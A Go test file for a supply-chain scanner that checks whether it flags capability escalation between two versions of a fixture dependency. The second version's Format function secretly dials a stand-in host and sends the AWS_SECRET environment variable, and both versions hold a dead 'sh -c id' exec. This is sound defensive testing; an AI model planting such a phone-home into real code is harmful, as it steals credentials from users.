package deps

import (
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/Voskan/codexsentinel/analyzer/result"
	codessa "github.com/Voskan/codexsentinel/analyzer/ssa"
	"github.com/Voskan/codexsentinel/analyzer/testutil"
)

const formatterV1 = `package formatter

import (
	"os/exec"
	"strings"
)

// Format upper-cases s.
func Format(s string) string { return strings.ToUpper(s) }

// debugExec is never called by the application.
func debugExec() { _ = exec.Command("sh", "-c", "id").Run() }
`

const formatterV2 = `package formatter

import (
	"net"
	"os"
	"os/exec"
	"strings"
)

// Format upper-cases s and, since this release, phones home.
func Format(s string) string {
	if conn, err := net.Dial("tcp", "collector.invalid:443"); err == nil {
		_, _ = conn.Write([]byte(os.Getenv("AWS_SECRET")))
		conn.Close()
	}
	return strings.ToUpper(s)
}

func debugExec() { _ = exec.Command("sh", "-c", "id").Run() }
`

func capabilityFixture(t *testing.T, formatter string) *CapabilityReport {
	t.Helper()
	fx := testutil.LoadFixture(t, map[string]string{
		"go.mod":                 "module example.com/app\n\ngo 1.24\n\nrequire example.com/formatter v0.0.0\n\nreplace example.com/formatter => ./formatter\n",
		"formatter/go.mod":       "module example.com/formatter\n\ngo 1.24\n",
		"formatter/formatter.go": formatter,
		"main.go": `package main

import (
	"fmt"

	"example.com/formatter"
)

func main() { fmt.Println(formatter.Format("hello")) }
`,
	}, nil)
	bundle, err := codessa.BuildFromWorkspace(fx.Workspace)
	if err != nil {
		t.Fatal(err)
	}
	report, err := AnalyzeCapabilities(fx.Workspace, bundle)
	if err != nil {
		t.Fatal(err)
	}
	return report
}

func TestCapabilitiesEscalation(t *testing.T) {
	t.Parallel()
	v1 := capabilityFixture(t, formatterV1)
	m, ok := v1.Module("example.com/formatter")
	if !ok || len(m.Capabilities) != 0 {
		t.Fatalf("v1 should have no reachable capabilities (dead debugExec ignored): %+v", v1)
	}
	lockPath := filepath.Join(t.TempDir(), ".codexsentinel.caps.json")
	if err := WriteCapabilityLock(lockPath, v1.Lock()); err != nil {
		t.Fatal(err)
	}
	lock, err := LoadCapabilityLock(lockPath)
	if err != nil {
		t.Fatal(err)
	}
	if caps, ok := lock.Modules["example.com/formatter"]; !ok || len(caps) != 0 {
		t.Fatalf("lock does not record the module: %+v", lock)
	}
	if esc := DiffCapabilities(lock, v1); len(esc) != 0 {
		t.Fatalf("unexpected escalation against own lock: %+v", esc)
	}

	v2 := capabilityFixture(t, formatterV2)
	m2, _ := v2.Module("example.com/formatter")
	if !reflect.DeepEqual(m2.Capabilities, []Capability{CapEnv, CapNetwork}) {
		t.Fatalf("v2 capabilities = %v (CAP_EXEC must stay unreachable)", m2.Capabilities)
	}
	if !strings.HasPrefix(m2.Evidence[CapEnv], "example.com/formatter.Format -> os.Getenv") || !strings.HasPrefix(m2.Evidence[CapNetwork], "example.com/formatter.Format -> net.Dial") {
		t.Fatalf("missing call path evidence: %+v", m2.Evidence)
	}
	esc := DiffCapabilities(lock, v2)
	if len(esc) != 1 || esc[0].Severity != result.SeverityCritical || !reflect.DeepEqual(esc[0].New, []Capability{CapEnv, CapNetwork}) {
		t.Fatalf("unexpected escalation: %+v", esc)
	}
	issues := EscalationIssues(esc, ".codexsentinel.caps.json")
	if len(issues) != 1 || issues[0].ID != "supply-chain-capability-escalation" || issues[0].Severity != result.SeverityCritical ||
		!strings.Contains(issues[0].Description, "example.com/formatter.Format -> net.Dial") {
		t.Fatalf("unexpected issue: %+v", issues)
	}
}

func TestCapabilitiesDiffSeverity(t *testing.T) {
	report := &CapabilityReport{Modules: []ModuleCapabilities{
		{Module: "a", Capabilities: []Capability{CapFSWrite}},
		{Module: "b", Capabilities: []Capability{CapExec}},
		{Module: "c", Capabilities: []Capability{CapFSRead, CapReflect}},
		{Module: "d", Capabilities: []Capability{CapEnv, CapNetwork}},
	}}
	lock := &CapabilityLock{Modules: map[string][]Capability{"a": {}, "b": {}, "c": {}, "d": {CapNetwork}}}
	got := map[string]result.Severity{}
	for _, e := range DiffCapabilities(lock, report) {
		got[e.Module] = e.Severity
	}
	want := map[string]result.Severity{"a": result.SeverityHigh, "b": result.SeverityCritical, "d": result.SeverityCritical}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("severities = %v, want %v", got, want)
	}
	if esc := DiffCapabilities(lock, &CapabilityReport{Modules: []ModuleCapabilities{{Module: "new", Capabilities: []Capability{CapUnsafe}}}}); len(esc) != 1 || !esc[0].NewDep {
		t.Fatalf("new dependency not flagged: %+v", esc)
	}
}
